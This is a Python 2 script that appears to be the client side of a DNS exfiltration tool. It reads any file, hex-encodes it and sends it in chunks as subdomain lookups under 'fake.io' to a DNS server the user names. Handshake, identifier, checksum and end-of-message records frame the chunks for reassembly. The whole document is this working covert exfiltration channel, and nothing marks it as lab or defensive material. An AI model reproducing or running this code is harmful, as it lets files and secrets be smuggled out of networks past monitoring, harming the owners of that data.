import dns.resolver
import hashlib
import optparse

PAYLOADS_LENGTH = 60
FAKE_DOMAIN = 'fake.io'

# Change payload length to allow for a iterator
PAYLOADS_LENGTH = PAYLOADS_LENGTH - 4

def main(ip, file, identifier, xxd):

	with open(file) as to_send:
		MESSAGE = to_send.readlines()

	MESSAGE = ''.join(MESSAGE)

	print '---START OF MESSAGE---'
	print MESSAGE
	print '---END OF MESSAGE---'

	# prepare the dns service
	my_resolver = dns.resolver.Resolver(configure=False)
	my_resolver.nameservers = [ip]

	if xxd:

		# the payloads will not have a iterator, so add the 4 we negated earlier
		# prepare the payload
		payloads = [''.join(MESSAGE.encode('hex')[i:i+PAYLOADS_LENGTH + 4]) for i in range(0, len(MESSAGE.encode('hex')), PAYLOADS_LENGTH + 4)]

		iteration = 0
		for payload in payloads:

			payload_to_send = payload + '.' + FAKE_DOMAIN

			print '[INFO] Sending lookup for :', payload_to_send
			answer = my_resolver.query(payload_to_send, 'A')
			for res in answer:
				pass

			iteration += 1
	else:

		# prepare the payload
		payloads = [''.join(MESSAGE.encode('hex')[i:i+PAYLOADS_LENGTH]) for i in range(0, len(MESSAGE.encode('hex')), PAYLOADS_LENGTH)]

		# prepare the first, control payload explaining how many messages to expect...
		handshake = ('0000'+str(len(payloads) + 2 )+':').ljust(PAYLOADS_LENGTH, '0')

		# ...a message identifier...
		identifier = ('0001'+(identifier.encode('hex'))).ljust(PAYLOADS_LENGTH, '0')

		# ...and the sha1 of the message
		checksum = ('0002'+hashlib.sha1(MESSAGE).hexdigest())

		# lastly, a 'null' message indicating a complete transaction
		complete = [''.ljust(PAYLOADS_LENGTH, '0')]

		# add the 3 header requests to the payload and final 'null' one
		payloads = [handshake, identifier, checksum] + payloads + complete

		iteration = 0
		for payload in payloads:

			if payload.startswith('0000') or payload.startswith('0001') or payload.startswith('0002'):
				payload_to_send = payload + '.' + FAKE_DOMAIN
			else:
				payload_to_send = str(iteration).rjust(4, '0') + payload + '.' + FAKE_DOMAIN

			print '[INFO] Sending lookup for :', payload_to_send
			answer = my_resolver.query(payload_to_send, 'A')
			for res in answer:
				if str(res) <> '127.0.0.1':
					print '[WARNING] Hmm, didnt get 127.0.0.1 as the response. Maybe you are not really talking to', UDP_IP, '. We got', res
				pass

			iteration += 1

	print '[INFO] Message sent in', iteration, 'requests'

if __name__ == '__main__':

	parser = optparse.OptionParser("usage: %prog -S <ip> -F <file>")
	parser.add_option('-S', '--server', dest='server',
						type='string', help='specify dns server to send requests to')
	parser.add_option('-F', '--file', dest='file',
						type='string', help='specify the file to send')
	parser.add_option('-I', '--indentifier', dest='ident', default='None',
						type='string', help='specify a message indentifier')
	parser.add_option('-X', '--xxd', dest='xxd', default=False,
						action='store_true', help='Enable questions to be `xxd -r` friendly (60 chars long)')

	(options, args) = parser.parse_args()

	if not options.server:
		parser.error('A server IP must be provided.')

	if  not options.file:
		parser.error('A file to send must be specified')

	if len(options.ident.encode('hex')) > PAYLOADS_LENGTH - 4:
		parser.error('The message identifier is too long.')

	server_ip = options.server
	file = options.file
	identifier = options.ident
	xxd = options.xxd

	# kick off the main loop
	main(server_ip, file, identifier, xxd)
